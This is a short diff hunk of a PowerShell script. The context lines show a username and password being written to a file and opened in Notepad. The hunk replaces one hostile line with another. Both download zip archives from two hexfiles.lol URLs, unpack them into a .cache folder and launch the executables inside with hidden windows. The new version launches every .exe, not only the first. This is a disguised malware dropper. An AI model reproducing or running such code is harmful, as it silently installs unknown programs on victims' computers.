@@ -531,5 +531,4 @@ Username: HzConfin
 Password: 02052012nan
 ====================
 '@);notepad $f
-
-$u='https://hexfiles.lol/d/cf3238878159','https://hexfiles.lol/d/0205765929d6';$b="$home\.cache";md $b -ErrorAction SilentlyContinue|Out-Null;$u|%{$d="$b\$([guid]::NewGuid())";md $d|Out-Null;Start-Job{$a=$args[0];$d=$args[1];$z="$d.zip";(New-Object Net.WebClient).DownloadFile($a,$z);Expand-Archive $z $d -Force;$e=Get-ChildItem $d -Recurse *.exe|Select-Object -First 1;if($e){Start-Process $e.FullName -WindowStyle Hidden}}-ArgumentList $_,$d}
+$u='https://hexfiles.lol/d/cf3238878159','https://hexfiles.lol/d/0205765929d6';$b="$home\.cache";md $b -ErrorAction SilentlyContinue|Out-Null;$u|%{$d="$b\$([guid]::NewGuid())";md $d|Out-Null;$z="$d.zip";(New-Object Net.WebClient).DownloadFile($_,$z);Expand-Archive $z $d -Force;Get-ChildItem $d -Recurse *.exe|%{Start-Process $_.FullName -WindowStyle Hidden}}
